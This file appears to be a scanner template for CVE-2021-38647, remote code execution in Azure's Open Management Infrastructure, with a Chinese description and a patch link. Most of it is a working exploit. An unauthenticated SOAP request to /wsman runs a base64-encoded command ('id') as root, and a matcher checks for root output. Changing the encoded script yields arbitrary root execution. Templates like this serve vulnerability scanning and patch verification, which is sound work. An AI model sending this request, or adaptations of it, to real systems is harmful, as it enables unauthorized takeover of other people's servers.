config/51pwn/yaml/Microsoft Azure/CVE-2021-38647.yaml

id: CVE-2021-38647
info:
  name: Microsoft Open Management Infrastructure - Remote Code Execution
  author:
  - l0ne1y
  description: |-
    Microsoft Azure Open Management Infrastructure 远程代码执行漏洞
    Microsoft Azure是美国微软（Microsoft）公司的一套开放的企业级云计算平台。

    microsoft Azure Open Management Infrastructure存在代码注入漏洞。以下产品和版本受到影响：Azure Open Management Infrastructure ＜omi-1.6.8-1
  severity: critical
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647
requests:
- matchers:
  - type: word
    condition: and
    words:
    - <p:StdOut>
    - uid=0(root) gid=0(root) groups=0
  raw:
  - |
    POST /wsman HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/soap+xml;charset=UTF-8

    <s:Envelope
      xmlns:s="http://www.w3.org/2003/05/soap-envelope"
      xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration"
      xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
      xmlns:xsi="http://www.w3.org/2001/XMLSchema"
      xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"
      xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
      <s:Header>
        <a:To>HTTP://{{Hostname}}/wsman/</a:To>
        <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
        <a:ReplyTo>
          <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
        </a:ReplyTo>
        <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteScript</a:Action>
        <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
        <a:MessageID>uuid:00B60932-CC01-0005-0000-000000010000</a:MessageID>
        <w:OperationTimeout>PT1M30S</w:OperationTimeout>
        <w:Locale xml:lang="en-us" s:mustUnderstand="false"/>
        <p:DataLocale xml:lang="en-us" s:mustUnderstand="false"/>
        <w:OptionSet s:mustUnderstand="true"/>
        <w:SelectorSet>
          <w:Selector Name="__cimnamespace">root/scx</w:Selector>
        </w:SelectorSet>
      </s:Header>
      <s:Body>
        <p:ExecuteScript_INPUT
          xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
          <p:Script>aWQ=</p:Script>
          <p:Arguments/>
          <p:timeout>0</p:timeout>
          <p:b64encoded>true</p:b64encoded>
        </p:ExecuteScript_INPUT>
      </s:Body>
    </s:Envelope>
